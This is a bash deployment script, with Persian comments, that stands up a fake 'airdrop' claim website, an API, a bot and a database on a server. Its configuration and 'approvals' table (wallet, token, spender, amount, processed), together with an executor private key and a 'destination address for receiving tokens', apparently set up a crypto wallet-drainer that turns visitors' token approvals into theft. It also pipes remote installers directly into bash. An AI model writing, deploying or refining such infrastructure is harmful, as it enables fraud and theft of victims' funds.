#!/bin/bash
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════╗"
echo "║     NexusProtocol — نصب خودکار               ║"
echo "║     سایت + API + ربات + دامنه + HTTPS        ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
DEPLOY="$ROOT/deploy"
cd "$ROOT"

# ─────────────────────────────────────────────────────────
# ۱. بررسی و نصب Docker
# ─────────────────────────────────────────────────────────
if ! command -v docker &>/dev/null; then
  echo -e "${YELLOW}📦 Docker نصب نیست — در حال نصب...${NC}"
  curl -fsSL https://get.docker.com | bash
  systemctl enable docker && systemctl start docker
  echo -e "${GREEN}✓ Docker نصب شد${NC}"
fi

# ─────────────────────────────────────────────────────────
# ۲. بررسی فایل .env
# ─────────────────────────────────────────────────────────
if [ ! -f "$DEPLOY/.env" ]; then
  cp "$DEPLOY/.env.example" "$DEPLOY/.env"
  echo -e "${RED}"
  echo "══════════════════════════════════════════════════════"
  echo "  فایل deploy/.env ساخته شد. لطفاً مقادیر را پر کن:"
  echo "    DOMAIN               ← دامنه سایت (مثلاً claim.mysite.com)"
  echo "    DB_PASSWORD          ← رمز دیتابیس"
  echo "    SESSION_SECRET       ← کلید امنیتی (openssl rand -hex 32)"
  echo "    EXECUTOR_PRIVATE_KEY ← کلید خصوصی کیف‌پول gas"
  echo "    DESTINATION_ADDRESS  ← آدرس دریافت توکن"
  echo "══════════════════════════════════════════════════════"
  echo -e "${NC}"
  echo "بعد از ویرایش: bash deploy/setup.sh"
  exit 1
fi

source "$DEPLOY/.env"

MISSING=()
[[ -z "$DOMAIN"               || "$DOMAIN"               == "claim.example.com"                          ]] && MISSING+=("DOMAIN")
[[ -z "$DB_PASSWORD"          || "$DB_PASSWORD"           == "change_this_strong_password_123"            ]] && MISSING+=("DB_PASSWORD")
[[ -z "$SESSION_SECRET"       || "$SESSION_SECRET"        == "change_this_to_random_64_char_string"       ]] && MISSING+=("SESSION_SECRET")
[[ -z "$EXECUTOR_PRIVATE_KEY" || "$EXECUTOR_PRIVATE_KEY"  == "your_private_key_here_without_0x"           ]] && MISSING+=("EXECUTOR_PRIVATE_KEY")
[[ -z "$SPENDER_ADDRESS"      || "$SPENDER_ADDRESS"       == "0xYourExecutorWalletPublicAddress"          ]] && MISSING+=("SPENDER_ADDRESS")
[[ -z "$DESTINATION_ADDRESS"  || "$DESTINATION_ADDRESS"   == "0xYourDestinationWalletAddress"             ]] && MISSING+=("DESTINATION_ADDRESS")

if [ ${#MISSING[@]} -ne 0 ]; then
  echo -e "${RED}❌ مقادیر زیر در deploy/.env پر نشدن:${NC}"
  for v in "${MISSING[@]}"; do echo "   • $v"; done
  exit 1
fi

echo -e "${GREEN}✓ تنظیمات بارگذاری شد — دامنه: ${BOLD}$DOMAIN${NC}"

# ─────────────────────────────────────────────────────────
# ۳. نصب ابزارهای سرور
# ─────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}🔧 نصب nginx، certbot، Node.js...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq nginx certbot python3-certbot-nginx curl

# Node.js 20
if ! command -v node &>/dev/null || [[ "$(node -v)" != v20* ]]; then
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1
  apt-get install -y -qq nodejs
fi

# pnpm
npm install -g pnpm@10 --quiet 2>/dev/null || true

# ─────────────────────────────────────────────────────────
# ۴. Build سایت React
# ─────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}🔨 Build سایت React (ممکنه ۲-۳ دقیقه طول بکشه)...${NC}"
pnpm install --no-frozen-lockfile --silent
BASE_PATH=/airdrop/ PORT=3000 NODE_ENV=production \
  pnpm --filter @workspace/airdrop run build

mkdir -p /var/www/nexus/airdrop
cp -r artifacts/airdrop/dist/public/. /var/www/nexus/airdrop/
echo -e "${GREEN}  ✓ فایل‌های سایت در /var/www/nexus/airdrop/${NC}"

# ─────────────────────────────────────────────────────────
# ۵. Docker — API + Bot + DB
# ─────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}🐳 Build سرویس‌های Docker (اولین بار ۵-۱۰ دقیقه)...${NC}"
cd "$DEPLOY"
docker compose build --parallel api bot
docker compose up -d db

echo "    ⏳ صبر برای آماده‌شدن PostgreSQL..."
for i in $(seq 1 30); do
  docker compose exec -T db pg_isready -U airdrop &>/dev/null && break
  sleep 2
done

# ─────────────────────────────────────────────────────────
# ۶. Schema دیتابیس (ساختار دقیق Drizzle)
# ─────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}🗄️  ساخت جداول دیتابیس...${NC}"
docker compose exec -T db psql -U airdrop -d airdrop << 'SQL'
CREATE TABLE IF NOT EXISTS approvals (
  id          TEXT        PRIMARY KEY,
  wallet      TEXT        NOT NULL,
  token       TEXT        NOT NULL,
  spender     TEXT        NOT NULL,
  amount      TEXT        NOT NULL,
  tx_hash     TEXT,
  chain_id    INTEGER     NOT NULL DEFAULT 1,
  wallet_type TEXT        NOT NULL DEFAULT 'MetaMask',
  processed   BOOLEAN     NOT NULL DEFAULT FALSE,
  created_at  TIMESTAMP   NOT NULL DEFAULT NOW()
);
SQL
echo -e "${GREEN}  ✓ جدول approvals آماده${NC}"

# اجرای API و Bot
docker compose up -d api bot
echo -e "${GREEN}  ✓ API و ربات در حال اجرا${NC}"

# ─────────────────────────────────────────────────────────
# ۷. تنظیم nginx با دامنه
# ─────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}🌐 تنظیم nginx برای دامنه $DOMAIN...${NC}"

cat > /etc/nginx/sites-available/nexus << NGINX
server {
    listen 80;
    server_name $DOMAIN;

    location /api/ {
        proxy_pass         http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header   Host              \$host;
        proxy_set_header   X-Real-IP         \$remote_addr;
        proxy_set_header   X-Forwarded-For   \$proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto \$scheme;
        proxy_read_timeout 30s;
    }

    location /airdrop/ {
        root /var/www/nexus;
        try_files \$uri \$uri/ /airdrop/index.html;
        expires 1h;
        add_header Cache-Control "public, no-transform";
    }

    location = / { return 301 /airdrop/; }

    location /health {
        return 200 "ok\n";
        add_header Content-Type text/plain;
    }

    gzip on;
    gzip_types text/plain application/javascript text/css application/json;
}
NGINX

ln -sf /etc/nginx/sites-available/nexus /etc/nginx/sites-enabled/nexus
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl reload nginx
echo -e "${GREEN}  ✓ nginx پیکربندی شد${NC}"

# ─────────────────────────────────────────────────────────
# ۸. گواهی SSL رایگان (Let's Encrypt)
# ─────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}🔐 گرفتن گواهی SSL از Let's Encrypt...${NC}"
echo "    (مطمئن شو DNS دامنه به این سرور اشاره کرده)"

if certbot --nginx -d "$DOMAIN" \
    --non-interactive --agree-tos \
    --email "admin@$DOMAIN" --redirect \
    2>&1 | tee /tmp/certbot.log | grep -E "(Congratulations|error|Error)" ; then
  echo -e "${GREEN}  ✓ HTTPS فعال شد${NC}"
  # تجدید خودکار SSL
  (crontab -l 2>/dev/null; echo "0 3 1 * * certbot renew --quiet && systemctl reload nginx") | crontab -
else
  echo -e "${YELLOW}  ⚠️  SSL نصب نشد — سایت روی HTTP در دسترسه"
  echo "       بعد از اینکه DNS آماده شد اجرا کن:"
  echo "       certbot --nginx -d $DOMAIN --non-interactive --agree-tos --email admin@$DOMAIN --redirect"
  echo -e "${NC}"
fi

# ─────────────────────────────────────────────────────────
# ✅ پایان
# ─────────────────────────────────────────────────────────
PROTOCOL="https"
command -v certbot &>/dev/null && certbot certificates 2>/dev/null | grep -q "$DOMAIN" || PROTOCOL="http"

echo ""
echo -e "${GREEN}${BOLD}"
echo "╔══════════════════════════════════════════════╗"
echo "║  ✅ نصب کامل شد!                             ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  🌐 سایت:  ${CYAN}${PROTOCOL}://$DOMAIN/airdrop/${NC}"
echo -e "  📡 API:   ${CYAN}${PROTOCOL}://$DOMAIN/api/approvals${NC}"
echo -e "  🤖 ربات:  در حال اجرا"
echo ""
echo "دستورات مفید:"
echo "  docker compose -f $DEPLOY/docker-compose.yml logs -f bot   ← لاگ ربات"
echo "  docker compose -f $DEPLOY/docker-compose.yml logs -f api   ← لاگ API"
echo "  docker compose -f $DEPLOY/docker-compose.yml ps            ← وضعیت سرویس‌ها"
echo "  docker compose -f $DEPLOY/docker-compose.yml restart bot   ← ری‌استارت ربات"
